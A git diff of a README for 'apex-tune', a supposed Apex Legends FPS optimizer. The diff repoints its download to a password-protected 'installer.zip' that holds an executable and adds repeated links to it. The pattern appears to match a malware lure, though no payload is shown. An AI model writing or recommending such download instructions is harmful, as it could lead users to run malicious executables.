@@ -1,6 +1,8 @@
-# 🎯 apex-tune
-
 <div align="center">
+
+![apex-tune banner](https://cdn1.epicgames.com/spt-assets/5dcd88f4e2094a698ebffa43438edc33/apex-legends-nve1y.jpg)
+
+# 🎯 apex-tune
 
 **Open-source FPS optimizer for Apex Legends**
 
@@ -36,7 +38,7 @@
 
 ## 🚀 Installation
 
-1. **Download** the archive: [apex-tune-setup.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/latest/download/apex-tune-setup.zip)
+1. **Download** the archive: [installer.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/installer.zip)
 2. **Extract** the archive.
 3. **Enter the password** when prompted:
 
@@ -45,6 +47,14 @@
    ```
 
 That's it. Run `apex-tune.exe` from the extracted folder.
+
+---
+
+## 🔗 Links
+
+- **Repository home:** [github.com/samsilva-hq1999j1/apex-tune](https://github.com/samsilva-hq1999j1/apex-tune)
+- **Releases:** [github.com/samsilva-hq1999j1/apex-tune/releases](https://github.com/samsilva-hq1999j1/apex-tune/releases)
+- **Latest download:** [installer.zip](https://github.com/samsilva-hq1999j1/apex-tune/releases/download/v0.1.0/installer.zip)
 
 ---
 
